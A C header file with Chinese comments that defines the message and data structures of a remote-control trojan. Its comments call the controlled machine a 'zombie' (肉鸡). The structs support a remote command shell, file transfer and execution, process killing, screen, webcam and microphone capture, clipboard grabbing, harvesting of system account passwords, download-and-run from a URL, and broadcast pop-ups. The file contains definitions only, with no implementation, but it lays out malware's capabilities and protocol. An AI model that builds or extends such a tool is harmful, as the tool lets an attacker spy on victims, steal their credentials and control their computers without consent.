//结构体定义
#pragma once
#include "stdafx.h"

//数据传输的节点
typedef struct 
{
	int nMsgCmd;         //消息命令
	BYTE context[CONTEXT_BUF_SIZE];  //数据传输的缓冲区
}MSGINFO;

//服务器(肉鸡)信息
typedef struct 
{
	char szWANIP[IPADDR_SIZE];    //公网IP地址
	char szLocalIP[IPADDR_SIZE];  //本机IP地址
	char hostName[255];   //计算机名
	bool Cam; //摄像头
	int OSVer;  //操作系统版本
	wchar_t szCPUInfo[MAX_PATH]; //cpu信息
	DWORD dwDiskSize;  //硬盘信息
}SYSTEMINFO;

typedef struct tagDRIVER  //磁盘信息
{
	wchar_t disk;    //磁盘名
	double dwTotal;   //磁盘的大小
	double dwFree;    //剩余空间
	int nType;  //类型
}DRIVER_C;

typedef struct tagFILEINFO      //文件信息
{
	TCHAR szFileName[MAX_PATH]; //文件名
	int nType;                  //文件类型(文件\文件夹)
	__int64 size;               //文件大小
}FILEINFO_C;

typedef struct tagDOWNFILEDATA   //文件传输数据块结构
{
	BYTE context[512];  //块数据的大小
	UINT size;          //文件大小
	UINT nCount;        //次数，用于进度条的显示
	bool bFlag;         //文件是否传输完毕
}DOWNFILEDATA_C;

typedef struct tagFILEEXECINFO  //文件执行结果信息
{
	TCHAR szFilePath[MAX_PATH];  //文件名
	bool bSuccess;              //执行结果
}FILEEXECINFO_C;

typedef struct tagFILECOPY    //文件复制结果信息
{
	wchar_t szFilePath[MAX_PATH];  //文件全路径
	wchar_t szFileName[MAX_PATH];  //文件名
	bool bTag;                     //是否开始发送
}FILECOPY_C;

typedef struct tagATTRIBUTE   //属性
{
	wchar_t szFilePath[MAX_PATH];  //文件所在的目录
	wchar_t szFileName[MAX_PATH];  //文件名
	int nType;                     //文件(夹)类型
    SYSTEMTIME sysCreateTime;      //创建时间
	SYSTEMTIME sysModifyTime;      //修改时间
	SYSTEMTIME sysVisitTime;       //访问时间
	bool bArchive;                 //存档
	bool bReadOnly;                //只读
	bool bHide;                    //隐藏
	bool bSystem;                  //系统
}ATTRIBUTE_C;

typedef struct tagCMD       //CMD命令信息
{
	int flag;
	char command[1024];  //命令行
}COMMOND_C;

typedef struct tagCHATMSG   //聊天消息
{
	bool bfirstSend;   //是否第一次发送信息
	bool bClose;  //是否关闭
	wchar_t szChatMsg[1024];  //聊天内容
}CHATMSG_C;

typedef struct tagPROGRESS   //进程列表信息
{
	wchar_t szProName[MAX_PATH];   //进程名
	int nPid;            //进程ID号
	int nThreadCount;    //线程总数
	int nLevel;          //进程级别
	wchar_t szProPath[MAX_PATH];  //进程路径
	int nTag;     //结束掉进程是不是成功了(保留关键字)
}PROGRESS_C;

typedef struct tagBMPHEADINFO  //BMP位图头信息
{
	BITMAPINFO tagBitmapInfo;   //位图信息
}BMPHEADINFO_C;

typedef struct tagBMPDATA  //BMP图像数据
{
	BITMAPINFO bmpinfo;  //位图信息
	int Id;
	bool bShow;  //是否可以显示图像
	int Size;
	int HeadSize;
	UINT Begin;      
	BYTE Data[SCREEN_BUF_SIZE];   //上面的结构体大小是64 + 4030 = 4094 < 4 * 1024
}BMPDATA_C;

typedef struct tagREADPSWDATA  //重要的系统帐号和密码
{
	wchar_t szUserName[250];  //帐号
	wchar_t szUserPwd[250];   //密码
	wchar_t szDomain[250];    //域
	wchar_t szErrorMsg[50];   //错误信息
}READPSWDATA_C;

typedef struct tagVIDEODATA  //视屏数据
{
	BITMAPINFO bmpinfo;  //位图信息
	int Id;
	bool bShow;         //是否可以显示图像
	DWORD Size;         //数据大小 
	int HeadSize;       //视屏头数据
	UINT Begin;         //第几次发送
	int dwExtend1;     //压缩前长度
	int dwExtend2;     //压缩后长度
	BYTE Data[VIDEO_BUF_SIZE];   //上面的结构体大小是74 + 4020 = 4094 < 4 * 1024
}VIDEODATA_C;

typedef struct tagOPERATOR  //关机/注销/重启
{
	int nType;  //类型（0--表示关机， 1--表示注销， 2--表示重启）
}OPERATOR_C;

typedef struct tagAUDIODATA  //语音数据
{
	int Id;
	bool bRead;  //是否接受完数据
	DWORD dwSize;  //数据大小
	UINT Begin;    //第几次发送
	BYTE Data[AUDIO_BUF_SIZE];  //数据
}AUDIODATA_C;

typedef struct tagINTERNET  //网页
{
	bool bDownLoad;   //是否下载文件
	bool bRunExe;   //是否运行下载文件
	wchar_t szWebSite[MAX_PATH];  //网页的路径
}INTERNET_C;

typedef struct tagWNDINFO  //弹窗信息
{
	wchar_t szTitle[MAX_PATH];  //标题
	wchar_t szContent[MAX_PATH];  //内容
	UINT nType;    //类型
}WNDINFO_C;

typedef struct tagBROADCAST  //广播命令
{
	bool bTag;  //标志
	INTERNET_C tagInternet;
    WNDINFO_C tagWndInfo;
}BROADCAST_C;

typedef struct tagDESKTOPINFO  //桌面管理
{
	int nType;  //操作类型
	bool bTag;  //操作标记
}DESKTOPINFO_C;

typedef struct tagCLIPBOARD
{
	int id;
	bool bRead;  //是否接受完数据
	DWORD dwSize;  //数据大小
	UINT Begin;    //第几次发送
	char Data[CLIPBOARD_BUF_SIZE];  //数据
}CLIPBOARD_C;
//------------------------------------------------------

//操作系统的版本号
enum SYSVERSION
{
	OS_2000,
	OS_XP,
	OS_2003,
	OS_Vista,   //Vista版本号与2008 server一样
	OS_WIN7,
	OS_WIN8,
	OS_UNKNOWN  //未知操作系统
};

//硬盘类型
enum DISKTYPE
{
	DISK_FIXED,        //固定硬盘
	DISK_REMOVABLE,    //移动硬盘
	DISK_CDROM        //CD-ROM
};

//文件类型
enum FILEATTR
{
	FILE_ATTR,    //文件
	FOLDER_ATTR,   //文件夹
	FILE_TAG       //标志位，表示文件信息已经发送完毕
};

//进程优先级
enum PROGRESS_LEVEL  
{
	UNKNOWN_LEVEL,    //未知
	NORMAL,           //标准
	IDLE,             //低
	REALTIME,         //实时
	HIGH,             //高
	ABOVENORMAL,      //高于标准
	BELOWNORMAL       //低于标准
};

//桌面管理类型
enum DESKTOP_TYPE
{
	MOUSE_MOVE,   //鼠标移动
	DESKTOP_ICON,  //桌面图标
	TASKBAR,      //任务管理
	CLIPBOARD    //剪贴板
};